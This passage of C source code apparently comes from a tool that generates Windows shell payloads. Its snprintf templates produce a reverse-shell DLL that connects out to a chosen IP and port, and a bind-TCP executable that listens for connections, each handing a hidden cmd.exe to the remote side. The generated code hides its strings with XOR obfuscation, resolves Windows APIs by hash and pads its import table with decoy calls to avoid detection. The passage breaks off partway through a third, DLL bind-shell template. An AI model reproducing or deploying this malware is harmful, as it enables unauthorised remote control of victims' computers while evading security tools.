        "typedef int (WINAPI* connect_t)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* closesocket_t)(SOCKET);\n"
        "typedef int (WINAPI* WSACleanup_t)(void);\n"
        "typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);\n"
        "typedef int (WSAAPI* inet_pton_t)(INT, PCSTR, PVOID);\n\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtClose_t)(HANDLE);\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"


        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char ip[] = {%s};\n"
        "char cmd[] = {%s};\n"
        "char ws2[] = {%s};\n"


        "WSAStartup_t pWSAStartup;\n"
        "WSASocketA_t pWSASocketA;\n"
        "inet_pton_t pinet_pton;\n"
        "htons_t phtons;\n"
        "connect_t pconnect;\n"
        "closesocket_t pclosesocket;\n"
        "WSACleanup_t pWSACleanup;\n"
        "CreateProcessA_t pCreateProcessA;\n"
        "funNtWaitForSingleObject_t pNtWaitForSingleObject;\n"
        "funNtClose_t pNtClose;\n\n"
        "VOID my_zero_memory(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "VOID connect_and_execute() {\n"
        "    obf((char*)cmd, sizeof(cmd), xkey, sizeof(xkey));\n"
        "    obf((char*)ip, sizeof(ip), xkey, sizeof(xkey));\n"

        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    WSADATA wsadata;\n"
        "    pWSAStartup(MAKEWORD(2, 2), &wsadata);\n"
        "    SOCKET socket = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (socket == INVALID_SOCKET) {\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    struct sockaddr_in remot_addr;\n"
        "    remot_addr.sin_family = AF_INET;\n"
        "    remot_addr.sin_port = phtons(%d);\n"

        "    pinet_pton(AF_INET, ip , &remot_addr.sin_addr);\n"


        "    if (pconnect(socket, (SOCKADDR*)&remot_addr, sizeof(remot_addr)) == SOCKET_ERROR) {\n"
        "        pclosesocket(socket);\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    my_zero_memory(&si, sizeof(si));\n"
        "    si.cb = sizeof(si);\n"
        "    si.dwFlags = STARTF_USESTDHANDLES;\n"
        "    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;\n"

        "    if (pCreateProcessA(NULL, cmd , NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
        "        pNtWaitForSingleObject(pi.hProcess, FALSE, &timeout);\n"
        "    }\n"
        "    pNtClose(pi.hProcess);\n"
        "    pNtClose(pi.hThread);\n"
        "    pclosesocket(socket);\n"
        "    pWSACleanup();\n"
        "}\n"
        "BOOL Inisialize_struct() {\n"
        "    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll_32 = GetModuleHandleH(NTDLL_djb2);\n"
        "    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddressH(hKernel32, LoadLibraryA_djb2);\n"

        "    obf((char*)ws2, sizeof(ws2), xkey, sizeof(xkey));\n"
        "    HMODULE hWs2_32 = pLoadLibraryA(ws2);\n"
        "    pWSAStartup = (WSAStartup_t)GetProcAddressH(hWs2_32, WSAStartup_djb2);\n"
        "    pWSASocketA = (WSASocketA_t)GetProcAddressH(hWs2_32, WSASocketA_djb2);\n"
        "    pinet_pton = (inet_pton_t)GetProcAddressH(hWs2_32, inet_pton_djb2);\n"
        "    phtons = (htons_t)GetProcAddressH(hWs2_32, htons_djb2);\n"
        "    pconnect = (connect_t)GetProcAddressH(hWs2_32, connect_djb2);\n"
        "    pclosesocket = (closesocket_t)GetProcAddressH(hWs2_32, closesocket_djb2);\n"
        "    pWSACleanup = (WSACleanup_t)GetProcAddressH(hWs2_32, WSACleanup_djb2);\n"
        "    pCreateProcessA = (CreateProcessA_t)GetProcAddressH(hKernel32, CreateProcessA_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject_t)GetProcAddressH(ntdll_32, NtWaitForSingleObject_djb2);\n"
        "    pNtClose = (funNtClose_t)GetProcAddressH(ntdll_32, NtClose_djb2);\n"
        "}\n"
        "VOID shell() {\n"
        "    Inisialize_struct();\n"
        "    connect_and_execute();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    shell();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obf_ip, obf_cmd, obf_ws2dll, port
    );
}
void _source_3_bind_tcp(char* payload, size_t size, const char* port_str) {


    int port = atoi(port_str);
    char* xkey = generate_random_string_key();
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);


    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "extern void* __cdecl memset(void*, int, size_t);\n"
        "#pragma intrinsic(memset)\n"
        "#pragma function(memset)\n\n"
        "void* __cdecl memset(void* Destination, int Value, size_t Size) {\n"
        "    unsigned char* p = (unsigned char*)Destination;\n"
        "    while (Size > 0) {\n"
        "        *p = (unsigned char)Value;\n"
        "        p++;\n"
        "        Size--;\n"
        "    }\n"
        "    return Destination;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "   if (!pAddress)"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define KERNEL32_djb2               0x84BD0AA5\n"
        "#define NTDLL_djb2                  0xC9D1067D\n"
        "#define LoadLibraryA_djb2           0x0E32C08B\n"
        "#define WSAStartup_djb2             0xB703C453\n"
        "#define WSASocketA_djb2             0x5F3B12CA\n"
        "#define htons_djb2                  0x17387BA1\n"
        "#define closesocket_djb2            0xF77E6C94\n"
        "#define WSACleanup_djb2             0x9CA98668\n"
        "#define CreateProcessA_djb2         0x579FB1E9\n"
        "#define WaitForSingleObject_djb2    0x9557AB2A\n"
        "#define CloseHandle_djb2            0xCE995EF7\n"
        "#define listen_djb2                 0xEE56E0C4\n"
        "#define accept_djb2                 0xEEF1AC25\n"
        "#define bind_djb2                   0x91FAB552\n"
        "#define NtWaitForSingleObject_djb2  0x2131236C\n"
        "#define NtClose_djb2                0x7E1EA2ED\n\n"

        "typedef int (WINAPI* WSAStartup_t)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef u_short(WINAPI* htons_t)(u_short);\n"
        "typedef int (WINAPI* closesocket_t)(SOCKET);\n"
        "typedef int (WINAPI* WSACleanup_t)(void);\n"
        "typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);\n"
        "typedef int (WINAPI* bind_t)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* listen_t)(SOCKET, int);\n"
        "typedef SOCKET(WINAPI* accept_t)(SOCKET, struct sockaddr*, int*);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtClose_t)(HANDLE);\n\n"
        "#define INITIAL_HASH 5429         \n"
        "#define INITIAL_SEED 6\n\n"

        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"

        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"

        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB					pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB					pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"


        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char cmd[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "WSAStartup_t pWSAStartup;\n"
        "WSASocketA_t pWSASocketA;\n"
        "htons_t phtons;\n"
        "closesocket_t pclosesocket;\n"
        "WSACleanup_t pWSACleanup;\n"
        "CreateProcessA_t pCreateProcessA;\n"
        "bind_t pbind;\n"
        "listen_t plisten;\n"
        "accept_t paccept;\n"
        "funNtWaitForSingleObject_t pNtWaitForSingleObject;\n"
        "funNtClose_t pNtClose;\n\n"
        "void zero_memory(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "void bind_tcp() {\n"
        "    obf((char*)cmd, sizeof(cmd), xkey, sizeof(xkey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    struct sockaddr_in server_addr, client_addr;\n"
        "    int client_addr_len = sizeof(client_addr);\n"
        "    WSADATA wsa;\n"
        "    pWSAStartup(MAKEWORD(2, 2), &wsa);\n"
        "    SOCKET listen_socket = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (listen_socket == INVALID_SOCKET) {\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    server_addr.sin_family = AF_INET;\n"
        "    server_addr.sin_port = phtons(%d);\n"
        "    server_addr.sin_addr.s_addr = INADDR_ANY;\n"
        "    if (pbind(listen_socket, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {\n"
        "        pclosesocket(listen_socket);\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    if (plisten(listen_socket, SOMAXCONN) == SOCKET_ERROR) {\n"
        "        pclosesocket(listen_socket);\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    int i = 0;\n"
        "    while (1) {\n"
        "        SOCKET client_socket = paccept(listen_socket, (SOCKADDR*)&client_addr, &client_addr_len);\n"
        "        if (client_socket == INVALID_SOCKET) {\n"
        "            pclosesocket(listen_socket);\n"
        "            pWSACleanup();\n"
        "        }\n"
        "        ZeroMemory(&si, sizeof(si));\n"
        "        si.cb = sizeof(si);\n"
        "        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;\n"
        "        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client_socket;\n"
        "        si.wShowWindow = SW_HIDE;\n"


        "        pCreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "        i++;\n"
        "        if (i == 5) {\n"
        "            pNtWaitForSingleObject(pi.hProcess, FALSE, &timeout);\n"
        "            pNtClose(pi.hProcess);\n"
        "            pNtClose(pi.hThread);\n"
        "            pclosesocket(client_socket);\n"
        "            break;\n"
        "        }\n"
        "        else {\n"
        "            pNtWaitForSingleObject(pi.hProcess, FALSE, NULL);\n"
        "            pNtClose(pi.hProcess);\n"
        "            pNtClose(pi.hThread);\n"
        "            pclosesocket(client_socket);\n"
        "        }\n"
        "    }\n"
        "    pclosesocket(listen_socket);\n"
        "    pWSACleanup();\n"
        "}\n"
        "BOOL Inisialize_struct() {\n"
        "    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll_32 = GetModuleHandleH(NTDLL_djb2);\n"
        "    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddressH(hKernel32, LoadLibraryA_djb2);\n"

        "    obf((char*)ws2, sizeof(ws2), xkey, sizeof(xkey));\n"
        "    HMODULE hWs2_32 = pLoadLibraryA(ws2);\n"
        "    pWSAStartup = (WSAStartup_t)GetProcAddressH(hWs2_32, WSAStartup_djb2);\n"
        "    pWSASocketA = (WSASocketA_t)GetProcAddressH(hWs2_32, WSASocketA_djb2);\n"
        "    phtons = (htons_t)GetProcAddressH(hWs2_32, htons_djb2);\n"
        "    pclosesocket = (closesocket_t)GetProcAddressH(hWs2_32, closesocket_djb2);\n"
        "    pWSACleanup = (WSACleanup_t)GetProcAddressH(hWs2_32, WSACleanup_djb2);\n"
        "    pCreateProcessA = (CreateProcessA_t)GetProcAddressH(hKernel32, CreateProcessA_djb2);\n"
        "    pbind = (bind_t)GetProcAddressH(hWs2_32, bind_djb2);\n"
        "    plisten = (listen_t)GetProcAddressH(hWs2_32, listen_djb2);\n"
        "    paccept = (accept_t)GetProcAddressH(hWs2_32, accept_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject_t)GetProcAddressH(ntdll_32, NtWaitForSingleObject_djb2);\n"
        "    pNtClose = (funNtClose_t)GetProcAddressH(ntdll_32, NtClose_djb2);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    Inisialize_struct();\n"
        "    bind_tcp();\n"
        "    return 0;\n"
        "}\n",
        xkey, obf_cmd, obf_ws2dll, port
    );
}
void _source_3_bind_tcp_dll(char* payload, size_t size, const char* port_str) {

    int port = atoi(port_str);
    char* xkey = generate_random_string_key();
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);


    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "extern void* __cdecl memset(void*, int, size_t);\n"
        "#pragma intrinsic(memset)\n"
        "#pragma function(memset)\n\n"
        "void* __cdecl memset(void* Destination, int Value, size_t Size) {\n"
        "    unsigned char* p = (unsigned char*)Destination;\n"
        "    while (Size > 0) {\n"
        "        *p = (unsigned char)Value;\n"
        "        p++;\n"
        "        Size--;\n"
        "    }\n"
        "    return Destination;\n"
        "}\n\n"
        "#define KERNEL32_djb2               0x84BD0AA5\n"
        "#define NTDLL_djb2                  0xC9D1067D\n"
        "#define LoadLibraryA_djb2           0x0E32C08B\n"
        "#define WSAStartup_djb2             0xB703C453\n"
        "#define WSASocketA_djb2             0x5F3B12CA\n"
        "#define htons_djb2                  0x17387BA1\n"
        "#define closesocket_djb2            0xF77E6C94\n"
        "#define WSACleanup_djb2             0x9CA98668\n"
        "#define CreateProcessA_djb2         0x579FB1E9\n"
        "#define WaitForSingleObject_djb2    0x9557AB2A\n"
        "#define CloseHandle_djb2            0xCE995EF7\n"
        "#define listen_djb2                 0xEE56E0C4\n"
        "#define accept_djb2                 0xEEF1AC25\n"
        "#define bind_djb2                   0x91FAB552\n"
        "#define NtWaitForSingleObject_djb2  0x2131236C\n"
        "#define NtClose_djb2                0x7E1EA2ED\n\n"
        "typedef int (WINAPI* WSAStartup_t)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef u_short(WINAPI* htons_t)(u_short);\n"
        "typedef int (WINAPI* closesocket_t)(SOCKET);\n"
        "typedef int (WINAPI* WSACleanup_t)(void);\n"
        "typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);\n"
        "typedef int (WINAPI* bind_t)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* listen_t)(SOCKET, int);\n"
        "typedef SOCKET(WINAPI* accept_t)(SOCKET, struct sockaddr*, int*);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtClose_t)(HANDLE);\n\n"
        "#define INITIAL_HASH 5429         \n"
        "#define INITIAL_SEED 6\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
